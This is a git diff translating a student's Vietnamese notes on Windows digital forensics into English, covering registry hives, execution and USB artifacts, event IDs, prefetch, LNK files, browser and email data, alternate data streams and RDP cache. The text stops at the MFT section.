@@ -5,117 +5,117 @@ tags: [note, study]
 ---
 {% raw %}
 # Task-2-Forensics
-Tìm hiểu về Window Registry: thay vì mỗi phần mềm tự tạo file config rời rạc, win gom hết mọi thông tin cấu hình từ phần cứng, phần mềm, user đến các chính sách bảo mật vào chung một cơ sở dữ liệu trung tâm. các file này lưu dưới dạng nhị phân, thường nằm sâu trong thư mục c:\windows\system32\config
+Learn about the Window Registry: instead of each software creating its own separate config file, Windows gathers all configuration information from hardware, software, users to security policies into one central database. These files are saved in binary format, usually deep in the c:\windows\system32\config folder
 
-nó kiểm soát hầu hết hoạt động trên máy. từ việc khởi động cần load driver hay service nào, đến lưu trữ phân quyền user, ghi lại lịch sử cắm usb, mở file hay chạy phần mềm nào trên hệ thống
+it controls most operations on the machine. From booting, which driver or service needs to be loaded, to storing user permissions, recording the history of USB plugging, opening files, or running any software on the system.
 
-Phân loại key:
+Key classification:
 
-mở regedit lên sẽ thấy 5 nhánh chính
+Open regedit and you will see 5 main branches
 
 <img width="901" height="365" alt="image" src="https://github.com/user-attachments/assets/e8f852d1-f76b-4519-8fbd-fbb2d4303d23" />
 
-HKEY_CLASSES_ROOT :save thông tin dùng chung cho toàn bộ hệ thống
+HKEY_CLASSES_ROOT : save information common to the entire system
 
-HKEY_CURRENT_USER:save thông tin cho người dùng đang đăng nhập vào hệ thống
+HKEY_CURRENT_USER: save information for users logging into the system
 
-HKEY_LOCAL_MACHINE: Chứa thông tin về hệ thống, phần cứng, phần mềm
+HKEY_LOCAL_MACHINE: Contains information about the system, hardware, software
 
-HKEY_USERS: Chứa thông tin của tất cả các User, mỗi user là một nhánh với tên là số ID của user đó
+HKEY_USERS: Contains information of all Users, each user is a branch with the name of that user's ID number
 
-HKEY_CURRENT_CONFIG: Lưu thông tin về phần cứng hiện tại đang sử dụng
+HKEY_CURRENT_CONFIG: Stores information about the current hardware in use
 
-HKEY_DYN_DATA: Là một phần của nhánh HKEY_LOCAL_MACHINE
+HKEY_DYN_DATA: Part of the HKEY_LOCAL_MACHINE branch
 
-các kiểu dữ liệu
+data types
 
-REG_BINARY: kiểu nhị phân
+REG_BINARY: binary type
 
-- REG_DWORD: kiểu Double Word
+- REG_DWORD: Double Word style
 
-- REG_EXPAND_SZ: kiểu chuỗi mở rộng đặc biệt. VD: "%SystemRoot%"
+- REG_EXPAND_SZ: special type of expansion string. Example: "%SystemRoot%"
 
-- REG_MULTI_SZ: kiểu chuỗi đặc biệt
+- REG_MULTI_SZ: special string type
 
-- REG_SZ: kiểu chuỗi chuẩn
+- REG_SZ: standard string type
 
-  vị trí:
+location:
 
-  HKEY_LOCAL_MACHINE\SYSTEM :save các cài đặt quan trọng, làm trung tâm quản lý cấu hình hệ thống. nằm tại \system32\config\system
+HKEY_LOCAL_MACHINE\SYSTEM : save important settings, central to system configuration management. located at \system32\config\system
 
-HKEY_LOCAL_MACHINE\SAM :save thông tin tài khoản user. nằm tại \system32\config\sam
+HKEY_LOCAL_MACHINE\SAM :save user account information. located at \system32\config\sam
 
-HKEY_LOCAL_MACHINE\SECURITY :save các cài đặt bảo mật. nằm tại \system32\config\security
+HKEY_LOCAL_MACHINE\SECURITY :save security settings. located at \system32\config\security
 
-HKEY_LOCAL_MACHINE\SOFTWARE :save thông tin phần mềm. nằm tại \system32\config\software
+HKEY_LOCAL_MACHINE\SOFTWARE :save software information. located at \system32\config\software
 
-HKEY_USERS\UserProfile :save thông tin người dùng. nằm tại \winnt\profiles\username
+HKEY_USERS\UserProfile :save user information. located at \winnt\profiles\username
 
-HKEY_USERS.DEFAULT :save thông tin người dùng mặc định. nằm tại \system32\config\default
+HKEY_USERS.DEFAULT :save default user information. located at \system32\config\default
 
 transaction logs:
-win không ghi trực tiếp vào hive, ghi tạm vào .LOG1, .LOG2
-thu thập chứng cứ phải lấy cả log để khôi phục key bị xóa
+win does not write directly to hive, temporarily writes to .LOG1, .LOG2
+Collecting evidence requires taking logs to recover deleted keys
 
 last write time:
-mỗi key có time stamp để dựng timeline
-value không có
+Each key has a time stamp to build a timeline
+value is not available
 
-artifact forensics cốt lõi:
-SYSTEM\CurrentControlSet\Enum\USBSTOR : xem lịch sử, serial usb đã cắm
-UserAssist, ShimCache, Amcache : xem lịch sử chạy phần mềm, dò malware
-Run, RunOnce, Services : chỗ malware hay nằm để tự khởi động
+Core forensics artifact:
+SYSTEM\CurrentControlSet\Enum\USBSTOR: view history, inserted usb serial
+UserAssist, ShimCache, Amcache: view software running history, detect malware
+Run, RunOnce, Services: where malware often resides to start automatically
 
 unallocated space:
-key bị xóa rớt xuống vùng trống, cắm tool vẫn moi lên được
+The deleted key falls into an empty area, but using the tool can still dig it up
 
-vị trí profile user win mới:
-C:\Users\username\NTUSER.DAT : thay cho winnt cũ
-C:\Users\username\AppData\Local\Microsoft\Windows\UsrClass.dat : xem lịch sử mở file, folder
+New win user profile location:
+C:\Users\username\NTUSER.DAT : replaces old winnt
+C:\Users\username\AppData\Local\Microsoft\Windows\UsrClass.dat : ​​view file and folder opening history
 
-tạo backup
+create backup
 
-bước 1: nhấn win+r gõ regedit > ok
+Step 1: press win+r type regedit > ok
 
 <img width="488" height="297" alt="image" src="https://github.com/user-attachments/assets/cf0440b5-2631-4928-9731-6778c93657e2" />
 
-bước 2: chọn file > export
+Step 2: select file > export
 
 <img width="883" height="538" alt="image" src="https://github.com/user-attachments/assets/a38ece83-19ea-47ad-90e5-100c90295c72" />
 
-bước 3: mục export range chọn all > đặt tên > save
+Step 3: In the export range section, select all > name > save
 
 <img width="752" height="662" alt="image" src="https://github.com/user-attachments/assets/8bb4f532-5b9a-4acc-86e6-7f35f30ab84a" />
 
-phục hồi
+recover
 
-bước 1: nhấn win+r gõ regedit > ok
+Step 1: press win+r type regedit > ok
 
 <img width="488" height="297" alt="image" src="https://github.com/user-attachments/assets/cf0440b5-2631-4928-9731-6778c93657e2" />
 
-bước 2: chọn file > import
+Step 2: select file > import
 
 <img width="666" height="458" alt="image" src="https://github.com/user-attachments/assets/06eaa305-3d85-4f30-a74a-36a0a12fa299" />
 
-bước 3: chọn file đã sao lưu > open
+Step 3: select the backed up file > open
 
 <img width="977" height="587" alt="image" src="https://github.com/user-attachments/assets/f84973ac-55dc-47fe-814c-6f93db746ab9" />
 
-công cụ phân tích registry forensics:
+Registry forensics analysis tool:
 
-Registry Explorer : xem timeline, khôi phục key bị xóa
+Registry Explorer: view timeline, restore deleted keys
 
-RegRipper : chạy script tự động moi artifact
+RegRipper: run script to automatically extract artifacts
 
-FTK Imager / KAPE : copy file hive khi win đang chạy, bị khóa
+FTK Imager / KAPE: copy hive files when Windows is running, locked
 
-Volatility : trích xuất registry, dump SAM thẳng từ RAM
+Volatility: extract registry, dump SAM straight from RAM
 
-Tìm hiểu về artifact của THM
+Learn about THM's artifact
 
 recent files:
 
-win tự maintain list file mở gần đây cho từng user, save trong hive NTUSER tại:
+Windows automatically maintains a list of recently opened files for each user, saved in the NTUSER hive at:
 
 ```
 NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
@@ -123,9 +123,9 @@ NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
 
 <img width="1365" height="735" alt="image" src="https://github.com/user-attachments/assets/28c3ac32-0fb6-40c0-8e21-0b655aeb3d76" />
 
-dùng Registry Explorer thì nó sort MRU lên trên cùng, cũ hơn xuống dưới, list luôn last opened time
+Using Registry Explorer, it sorts MRU to the top, older to the bottom, the list is always last opened time
 
-key này có sub-key theo từng extension, muốn tìm theo loại file cụ thể thì chui vào ví dụ:
+This key has sub-keys for each extension. If you want to search by a specific file type, go to the example:
 
 ```
 NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.pdf
@@ -138,31 +138,31 @@ NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.pdf
 
 office recent files:
 
-office cũng maintain list riêng, save trong NTUSER tại:
+office also maintains its own list, saved in NTUSER at:
 
 ```
 NTUSER.DAT\Software\Microsoft\Office\VERSION
 ```
 
-ví dụ office 2013:
+Office 2013 example:
 
 ```
 NTUSER.DAT\Software\Microsoft\Office\15.0\Word
 ```
 
-từ office 365 trở đi bind thêm live ID của user:
+From office 365 onwards, bind to add the user's live ID:
 
 ```
 NTUSER.DAT\Software\Microsoft\Office\VERSION\UserMRU\LiveID_####\FileMRU
 ```
 
-location này save luôn full path của file
+This location always saves the full path of the file
 
 ---
 
 shellbags:
 
-win save layout của từng folder khi user mở, dùng để xác định file/folder nào đã được truy cập, nằm tại:
+win saves the layout of each folder when the user opens it, used to determine which files/folders have been accessed, located at:
 
 ```
 USRCLASS.DAT\Local Settings\Software\Microsoft\Windows\Shell\Bags
@@ -173,13 +173,13 @@ NTUSER.DAT\Software\Microsoft\Windows\Shell\Bags
 
 <img width="1412" height="713" alt="image" src="https://github.com/user-attachments/assets/b3910cbc-9401-4ca8-9a22-122c9754ad9d" />
 
-Registry Explorer không show được nhiều, dùng ShellBag Explorer trong bộ Eric Zimmerman's tools, point vào file hive là nó parse ra luôn
+Registry Explorer doesn't show much, use ShellBag Explorer in Eric Zimmerman's tools, point to the hive file and it will parse it.
 
 ---
 
 open/save and lastvisited dialog MRUs:
 
-win ghi nhớ location user dùng trong dialog mở/save file, trace qua:
+Windows remembers the user location used in the open/save file dialog, trace via:
 
 ```
 NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePIDlMRU
@@ -189,7 +189,7 @@ NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveP
 <img width="947" height="707" alt="image" src="https://github.com/user-attachments/assets/1d7b93fa-a20d-4e5d-9cbc-f54f7f4504e7" />
 
 
-và Lastvisited
+and Lastvisited
 
 ```
 NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU
@@ -202,9 +202,9 @@ NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisit
 windows explorer address/search bars:
 
 
-typedpaths: registry key lưu trữ các đường dẫn do người dùng gõ hoặc dán trực tiếp vào thanh địa chỉ của windows explorer.
+typedpaths: registry key stores paths typed or pasted by the user directly into the address bar of windows explorer.
 
-wordwheelquery: registry key lưu trữ các từ khóa do người dùng nhập vào thanh tìm kiếm của windows explorer.
+wordwheelquery: registry key stores keywords entered by the user into the search bar of windows explorer.
 ```
 NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
 NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery
@@ -212,17 +212,17 @@ NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery
 
 <img width="1047" height="723" alt="image" src="https://github.com/user-attachments/assets/5d53f02d-e227-4593-bd5e-09fb7249d460" />
 
-và 
+and
 
 <img width="907" height="722" alt="image" src="https://github.com/user-attachments/assets/86ce3b76-c66a-459a-bd0c-8439225a0c39" />
 
 
-ở task 8:
+in task 8:
 
 userassist:
 
 
-win tự track app nào user mở qua windows explorer, save lại để thống kê. info gồm tên app, số lần chạy, thời điểm launch. key này map theo GUID của từng user nên mỗi user có riêng, nằm trong NTUSER hive tại:
+Windows automatically tracks which apps users open via Windows Explorer, saving them for statistics. info includes app name, number of runs, launch time. This key maps to the GUID of each user, so each user has its own, located in NTUSER hive at:
 
 
 ```
@@ -233,21 +233,21 @@ NTUSER.DAT\Software\Microsoft\Windows\Currentversion\Explorer\UserAssist\{GUID}\
 <img width="1063" height="701" alt="image" src="https://github.com/user-attachments/assets/3715ea71-4474-43d8-8035-eecea108975a" />
 
 
-app chạy qua cmd thì không có ở đây
+app running through cmd is not here
 
 ---
 
 shimcache:
 
-mục đích gốc là đảm bảo app cũ vẫn chạy được trên win mới, nhưng forensics khai thác nó vì nó track tất cả app đã chạy trên máy, nằm trong SYSTEM hive tại:
+The original purpose is to make sure the old app can still run on the new Windows, but forensics exploits it because it tracks all the apps running on the device, located in SYSTEM hive at:
 
 ```
 SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
 ```
 
-save: tên file, file size, last modified time của executable
+save: file name, file size, last modified time of executable
 
-Registry Explorer không phân tích được, phải dùng AppCompatCache Parser trong bộ Eric Zimmerman's tools, output ra CSV rồi xem bằng EZviewer:
+Registry Explorer cannot analyze, must use AppCompatCache Parser in Eric Zimmerman's tools, output to CSV and then view with EZviewer:
 
 ```
 AppCompatCacheParser.exe --csv <path to save output> -f <path to SYSTEM hive> -c <control set to parse>
@@ -257,13 +257,13 @@ AppCompatCacheParser.exe --csv <path to save output> -f <path to SYSTEM hive> -c
 
 amcache:
 
-artifact họ hàng với shimcache, cùng track app đã chạy nhưng save thêm nhiều thứ hơn, đặc biệt là có SHA1 hash của executable nên dùng để dò malware được. file hive nằm thẳng trên filesystem tại:
+The artifact is related to shimcache, tracks the running app but saves more things, especially has the SHA1 hash of the executable so it can be used to detect malware. The hive file is located directly on the filesystem at:
 
 ```
 C:\Windows\appcompat\Programs\Amcache.hve
 ```
 
-info program execute gần nhất nằm tại:
+The nearest info program execute is located at:
 
 ```
 Amcache.hve\Root\File\{Volume GUID}\
@@ -274,28 +274,28 @@ save: execution path, installation time, execution time, deletion time, SHA1 has
 
 BAM/DAM:
 
-**BAM** — Background Activity Monitor: track background app đang chạy
+**BAM** — Background Activity Monitor: tracks background app running
 
-**DAM** — Desktop Activity Moderator: quản lý power consumption
+**DAM** — Desktop Activity Moderator: manages power consumption
 
-cả hai thuộc Modern Standby system, forensics quan tâm vì nó save full path và last execution time của program, nằm trong SYSTEM hive tại:
+Both belong to the Modern Standby system, forensics is of interest because it saves the full path and last execution time of the program, located in the SYSTEM hive at:
 
 ```
 SYSTEM\CurrentControlSet\Services\bam\UserSettings\{SID}
 SYSTEM\CurrentControlSet\Services\dam\UserSettings\{SID}
 ```
 
-key theo SID nên mỗi user có data riêng
+key according to SID so each user has its own data
 
 ---
 
-ở lab 9
+in lab 9
 
-các artifact được liệt kê là:
+The artifacts listed are:
 
 device identification
 
-công dụng: theo dõi các USB đã được cắm vào hệ thống. artifact này lưu trữ các thông tin như ID nhà sản xuất, ID sản phẩm , phiên bản (version) và thời gian USB được cắm vào để giúp điều tra viên xác định chính xác các thiết bị duy nhất
+Use: monitor USBs plugged into the system. This artifact stores information such as manufacturer ID, product ID, version and time the USB was plugged in to help investigators accurately identify unique devices.
 
 
 <img width="1346" height="711" alt="image" src="https://github.com/user-attachments/assets/a5568959-0c37-4386-b5ee-8fe54a0dac0f" />
@@ -303,41 +303,41 @@ công dụng: theo dõi các USB đã được cắm vào hệ thống. artifact
 
 First/Last Time
 
-công dụng: theo dõi và cung cấp các mốc thời gian cụ thể về việc kết nối và ngắt kết nối của thiết bị, bằng cách thay thế 4 số cuối trong đường dẫn,có thể tìm được:
+Uses: track and provide specific timestamps about device connections and disconnections. By replacing the last 4 numbers in the path, you can find:
 
-0064: thời gian kết nối lần đầu
+0064: first connection time
 
-0066: thời gian kết nối lần cuối
+0066: last connection time
 
-0067: thời gian ngắt kết nối/rút ra lần cuối
+0067: last disconnect/unplug time
 
 SYSTEM\CurrentControlSet\Enum\USBSTOR\Ven_Prod_Version\USBSerial#\Properties\{83da6326-97a6-4088-9453-a19231573b29}\####
 
-Máy em chưa có USBSTOR vì chưa ghi nhận USB storage/removable drive được cắm vào nênn không thể cap được 
+My computer doesn't have USBSTOR yet because it hasn't registered that USB storage/removable drive is plugged in, so it can't be plugged in
 
 USB device Volume Name
 
-công dụng: dùng để tìm tên thiết bị của ổ đĩa được kết nối.có thể sử dụng thông tin mã định danh GUID ở khóa này để đối chiếu với Disk ID từ các phần định danh ở trên, từ đó liên kết chính xác tên gọi của các thiết bị duy nhất
+Use: used to find the device name of the connected drive. You can use the GUID identifier information in this key to compare with the Disk ID from the identifiers above, thereby accurately linking the names of unique devices.
 
 SOFTWARE\Microsoft\Windows Portable Devices\Devices
 
 <img width="1912" height="1074" alt="image" src="https://github.com/user-attachments/assets/46d0d5b6-4b6d-4317-ac9e-7c6efefa24d2" />
 
-tìm hiểu sâu về các artifact forensics
+Learn deeply about forensic artifacts
 
 1. event logs
 
-công dụng:
-event logs là nhật ký hoạt động của windows. artifact này dùng để xem hệ thống đã xảy ra chuyện gì, ai đăng nhập, đăng nhập lúc nào, có lỗi gì, có chạy service, powershell, rdp hay scheduled task không.
+Uses:
+event logs are windows activity logs. This artifact is used to see what happened to the system, who logged in, when, what errors occurred, and whether services, powershell, rdp or scheduled tasks were running.
 
-vị trí:
+location:
 
 C:\Windows\System32\winevt\Logs\
 
 <img width="1016" height="973" alt="image" src="https://github.com/user-attachments/assets/e9249af7-3364-44ba-a395-a590de832dff" />
 
 
-các file hay gặp:
+Common files:
 
 
 Security.evtx
@@ -378,28 +378,28 @@ Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx
 
 
 
-soi gì:
-Security.evtx: soi đăng nhập, đăng xuất, user, quyền admin
+what to look for:
+Security.evtx: log in, log out, user, admin rights
 System.evtx: soi service, driver, shutdown, startup
-PowerShell logs: soi lệnh/script powershell
-TaskScheduler logs: soi task được tạo, sửa, xóa, chạy
+PowerShell logs: look at powershell commands/scripts
+TaskScheduler logs: shows tasks created, edited, deleted, and run
 TerminalServices logs: soi RDP
 
-event id hay gặp:
+Common event id:
 
-4624 = đăng nhập thành công
-4625 = đăng nhập thất bại
-4634 = đăng xuất
-4648 = đăng nhập bằng credential cụ thể
-4672 = tài khoản có quyền đặc biệt
-4720 = tạo user
-4726 = xóa user
-4732 = thêm user vào group
-7045 = service mới được cài
-1149 = RDP authentication thành công
+4624 = successful login
+4625 = login failed
+4634 = log out
+4648 = login with specific credential
+4672 = account has special permissions
+4720 = create user
+4726 = delete user
+4732 = add user to group
+7045 = new service installed
+1149 = RDP authentication successful
 21 = RDP session logon
 23 = RDP session logoff
-106 = task được register
+106 = task is registered
 200 = task action started
 201 = task action completed
 4104 = powershell script block logging
@@ -418,7 +418,7 @@ EvtxECmd
 
 
 note:
-event logs là artifact nên soi đầu tiên khi dựng timeline. nó cho biết bối cảnh chính: ai vào máy, vào bằng cách nào, lúc nào, và có hành động hệ thống gì xảy ra.
+Event logs are artifacts that should be looked at first when building a timeline. It tells the main context: who entered the machine, how, when, and what system actions occurred.
 
 
 2. prefetch
@@ -427,14 +427,14 @@ event logs là artifact nên soi đầu tiên khi dựng timeline. nó cho biế
 <img width="997" height="995" alt="image" src="https://github.com/user-attachments/assets/6e782769-91eb-49a6-8185-f2a85fee30e0" />
 
 
-công dụng:
-prefetch dùng để xác định chương trình nào đã từng chạy trên máy. nó lưu tên executable, số lần chạy, thời gian chạy gần nhất và một số file/dll được load khi chương trình chạy.
+Uses:
+prefetch is used to determine which programs have been running on the computer. It stores the executable name, number of runs, last run time and some files/dlls loaded when the program runs.
 
-vị trí:
+location:
 
 C:\Windows\Prefetch\
 
-file có dạng:
+file has the form:
 
 POWERSHELL.EXE-xxxxxxxx.pf
 
@@ -444,12 +444,12 @@ CHROME.EXE-xxxxxxxx.pf
 
 MALWARE.EXE-xxxxxxxx.pf
 
-soi gì:
-- tên file exe đã chạy
+what to look for:
+- The name of the exe file that was run
 - run count
 - last execution time
 - previous execution times
-- path/file liên quan được load
+- related path/file is loaded
 - volume information
 
 tool:
@@ -470,16 +470,16 @@ Timeline Explorer
 <img width="1274" height="761" alt="image" src="https://github.com/user-attachments/assets/59e4288e-e039-4ed9-bbf8-759f84cf3a54" />
 
 
-ghi chú:
-prefetch rất mạnh để chứng minh một file exe từng được chạy, kể cả khi file gốc đã bị xóa. nhưng trên windows server hoặc máy bị tắt prefetch thì có thể không có artifact này.
+note:
+prefetch is very powerful in proving that an exe file was ever run, even if the original file has been deleted. But on windows server or machine with prefetch turned off, this artifact may not be present.
 
 
 3. lnk files
 
-công dụng:
-lnk là shortcut file. windows thường tạo lnk khi user mở file gần đây. artifact này giúp biết user đã mở file nào, file đó nằm ở đâu, có nằm trên usb/network share không, và đôi khi lưu cả volume label, serial, hostname.
+Uses:
+lnk is the file shortcut. Windows often creates lnk when the user opens a recent file. This artifact helps know which file the user has opened, where that file is located, whether it is on a USB/network share, and sometimes saves the volume label, serial, and hostname.
 
-vị trí:
+location:
 
 C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Recent\
 
@@ -499,11 +499,11 @@ C:\Users\<user>\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pi
 <img width="970" height="919" alt="image" src="https://github.com/user-attachments/assets/b118b2a6-217e-4e01-80fc-370884ff7d06" />
 
 
-soi gì:
+what to look for:
 - target path
 - working directory
 - command line arguments
-- created/modified/accessed time của target
+- create/modified/accessed time of target
 - lnk MAC time
 - volume label
 - volume serial number
@@ -511,7 +511,7 @@ soi gì:
 - network path
 - machine id / hostname
 
-ví dụ:
+For example:
 E:\secret\report.docx
 \\192.168.1.10\share\payload.exe
 
@@ -522,16 +522,16 @@ tool:
 - FTK Imager
 - Autopsy
 
-ghi chú:
-lnk cực hữu ích khi file gốc đã bị xóa. nó vẫn có thể giữ lại đường dẫn cũ, tên file, ổ đĩa, usb label hoặc network share từng được mở.
+note:
+lnk is extremely useful when the original file has been deleted. it can still retain the old path, file name, drive, usb label or network share that was opened.
 
 
 4. browser history
 
-công dụng:
-browser history dùng để điều tra hoạt động web của user: đã truy cập website nào, tải file gì, tải từ đâu, lưu ở đâu, tìm kiếm gì, có cookie/session/cache gì không.
+Uses:
+Browser history is used to investigate the user's web activities: what website has he visited, what file has he downloaded, where did he download it from, where did he save it, what did he search for, are there any cookies/sessions/cache.
 
-vị trí chrome hoặc Cococ:
+chrome or Cococ location:
 
 C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\
 
@@ -539,7 +539,7 @@ C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\
 <img width="1002" height="955" alt="image" src="https://github.com/user-attachments/assets/e902a96b-7d77-4fb5-b780-384b8e2a05e3" />
 
 
-vị trí edge:
+edge position:
 
 C:\Users\<user>\AppData\Local\Microsoft\Edge\User Data\Default\
 
@@ -547,7 +547,7 @@ C:\Users\<user>\AppData\Local\Microsoft\Edge\User Data\Default\
 <img width="1012" height="960" alt="image" src="https://github.com/user-attachments/assets/6b1057c7-d5e1-4ffe-8487-04a1da5ae55b" />
 
 
-file quan trọng chrome/edge:
+Important files chrome/edge:
 
 
 History
@@ -565,8 +565,8 @@ Code Cache\
 Network\
 
 
-soi gì:
-- url đã truy cập
+what to look for:
+- visited url
 - visit time
 - typed count
 - download path
@@ -574,7 +574,7 @@ soi gì:
 - search keyword
 - cookies
 - cache
-- extension đáng ngờ
+- suspicious extensions
 
 table chrome/edge hay soi:
 
@@ -596,27 +596,27 @@ tool:
 - NirSoft tools
 - KAPE
 
-ghi chú:
-browser history giúp nối được hành vi tải malware/phishing/webmail/cloud. khi thấy file độc trong Downloads, nên soi browser để biết nó tải từ URL nào.
+note:
+browser history helps track malware/phishing/webmail/cloud download behavior. When you see a malicious file in Downloads, you should check your browser to see which URL it downloaded from.
 
 
 5. ost/pst file
 
-công dụng:
-ost/pst là file dữ liệu của microsoft outlook. dùng để phân tích email, attachment, mail gửi/nhận, mail đã xóa, calendar, contacts và dấu hiệu phishing/exfil qua email.
+Uses:
+ost/pst is the data file of microsoft outlook. Used to analyze emails, attachments, sent/received mail, deleted mail, calendar, contacts and phishing/exfil signs via email.
 
-khác nhau:
-OST = Offline Storage Table, thường là cache từ Exchange/Office 365/IMAP
-PST = Personal Storage Table, thường là file archive/export cá nhân
+different:
+OST = Offline Storage Table, usually cache from Exchange/Office 365/IMAP
+PST = Personal Storage Table, usually a personal archive/export file
 
-vị trí OST:
+OST location:
 
 C:\Users\<user>\AppData\Local\Microsoft\Outlook\
 
 <img width="1006" height="716" alt="image" src="https://github.com/user-attachments/assets/56a19425-4081-4d63-ba66-a8c01c6b6e44" />
 
 
-vị trí PST:
+PST location:
 
 C:\Users\<user>\Documents\Outlook Files\
 
@@ -624,9 +624,9 @@ C:\Users\<user>\Documents\Outlook Files\
 <img width="988" height="963" alt="image" src="https://github.com/user-attachments/assets/9e10254b-268d-4958-89ee-70eb4c72520b" />
 
 
-hoặc nơi user tự lưu.
+or where the user saves themselves.
 
-soi gì:
+what to look for:
 - inbox/sent/deleted
 - subject
 - sender
@@ -638,7 +638,7 @@ soi gì:
 - conversation thread
 - calendar
 - contacts
-- mail đã xóa nếu chưa purge
+- deleted mail if not purge
 
 tool:
 - Outlook
@@ -650,24 +650,24 @@ tool:
 - Autopsy
 - Magnet AXIOM
 
-ghi chú:
-ost/pst rất quan trọng khi nghi ngờ phishing hoặc exfil qua mail. nên soi cả sent items, deleted items và attachment.
+note:
+ost/pst is very important when suspecting phishing or exfil via mail. You should check sent items, deleted items and attachments.
 
 
 6. eml file
 
-công dụng:
-eml là file email dạng raw message. nó chứa header, body, MIME structure và attachment. dùng nhiều khi phân tích phishing email hoặc email export riêng lẻ.
+Uses:
+eml is a raw message email file. it contains header, body, MIME structure and attachment. Used a lot when analyzing phishing emails or individual email exports.
 
-vị trí:
-không có vị trí cố định, thường nằm ở:
+location:
+does not have a fixed location, usually located in:
 
 C:\Users\<user>\Downloads\
 C:\Users\<user>\Desktop\
 C:\Users\<user>\Documents\
-thư mục export email
+email export folder
 
-soi gì:
+what to look for:
 - From
 - To
 - Cc/Bcc
@@ -689,36 +689,36 @@ tool:
 - Thunderbird
 - emlAnalyzer
 - CyberChef
-ghi chú:
-với eml phishing, không chỉ nhìn From. phải soi Received chain, Reply-To, Return-Path, Authentication-Results và attachment/url trong body.
+note:
+With eml phishing, don't just look at From. must look for Received chain, Reply-To, Return-Path, Authentication-Results and attachment/url in the body.
 
 
 7. alternate data stream
 
-công dụng:
-alternate data stream, viết tắt ADS, là tính năng của NTFS cho phép một file có thêm stream dữ liệu ẩn. attacker có thể giấu payload hoặc script trong ADS.
+Uses:
+alternate data stream, abbreviated ADS, is a feature of NTFS that allows a file to have an additional hidden data stream. Attackers can hide payloads or scripts in ADS.
 
-ví dụ:
+For example:
 
 note.txt:hidden.exe
 test.txt:hidden.ps1
 
-vị trí:
-ADS không nằm ở folder riêng. nó gắn trực tiếp vào file trên phân vùng NTFS.
+location:
+ADS is not in a separate folder. it mounts directly to files on NTFS partitions.
 
-ví dụ:
+For example:
 
 C:\Users\Public\readme.txt:payload.exe
 C:\Temp\test.txt:hidden.ps1
 
-cách kiểm tra bằng cmd:
+How to check using cmd:
 
 dir /r
 
 <img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/2a3dd734-eba2-4585-9fd4-8cedcad9a781" />
 
 
-cách kiểm tra bằng powershell:
+How to test using powershell:
 
 Get-Item -Path .\file.txt -Stream *
 Get-Content .\file.txt -Stream hidden
@@ -727,21 +727,21 @@ Get-Content .\file.txt -Stream hidden
 <img width="1423" height="751" alt="image" src="https://github.com/user-attachments/assets/a25a98b0-bdab-4199-970b-8c0e1d45d3d7" />
 
 
-soi gì:
-- tên stream
-- kích thước stream
+what to look for:
+- stream name
+- stream size
 - file host
-- nội dung stream
+- stream content
 - Zone.Identifier
 
 Zone.Identifier:
-đây là ADS phổ biến, cho biết file có nguồn từ internet hay không.
+This is a common ADS, indicating whether the file is sourced from the internet or not.
 
-ví dụ:
+For example:
 
 download.exe:Zone.Identifier
 
-có thể chứa:
+may contain:
 
 ZoneId=3
 ReferrerUrl=
@@ -755,59 +755,59 @@ tool:
 - FTK Imager
 - Autopsy
 
-ghi chú:
-ADS hay bị bỏ qua vì nhìn file bình thường không thấy. khi gặp file đáng ngờ trên NTFS, nên chạy dir /r hoặc streams.exe để kiểm tra.
+note:
+ADS is often overlooked because the file cannot be seen normally. When encountering a suspicious file on NTFS, you should run dir /r or streams.exe to check.
 
 
 8. RDP Cache
 
-công dụng:
-RDP Cache lưu lại các mảnh hình ảnh bitmap khi user dùng Remote Desktop. artifact này có thể giúp phục dựng một phần màn hình remote mà user từng nhìn thấy.
+Uses:
+RDP Cache saves bitmap image fragments when users use Remote Desktop. This artifact can help restore part of the remote screen that the user has seen.
 
-vị trí:
+location:
 
 C:\Users\<user>\AppData\Local\Microsoft\Terminal Server Client\Cache\
 
-file thường gặp:
+Common files:
 
 Cache0000.bin
 Cache0001.bin
 bcache22.bmc
 bcache24.bmc
 
-soi gì:
-- fragment màn hình remote
-- cửa sổ ứng dụng
-- tên file hiển thị
+what to look for:
+- remote screen fragment
+- application window
+- file name displayed
 - terminal output
-- địa chỉ ip/hostname nếu xuất hiện trên giao diện
-- tool attacker mở trong phiên RDP
+- IP address/hostname if appears on the interface
+- The attacker tool opens during the RDP session
 
 tool:
 - BMC-Tools
 - RdpCacheStitcher
 - RDP Cache Stitcher
 
-ghi chú:
-RDP Cache không phải lúc nào cũng reconstruct đẹp. nó thường dùng làm bằng chứng hỗ trợ, nhất là khi cần ảnh màn hình từ phiên remote.
+note:
+RDP Cache does not always reconstruct beautifully. it is often used as supporting evidence, especially when a screenshot from a remote session is needed.
 
 
 9. MFT
 
-công dụng:
-MFT, tức Master File Table, là bảng quản lý file chính của NTFS. gần như mọi file/folder trên phân vùng NTFS đều có record trong MFT. dùng để biết file từng tồn tại, bị xóa, đổi tên, tạo/sửa/truy cập lúc nào.
+Uses:
+MFT, or Master File Table, is the main file management table of NTFS. Almost every file/folder on an NTFS partition has a record in the MFT. Used to know when a file existed, was deleted, renamed, created/edited/accessed.
 
-vị trí:
+location:
 
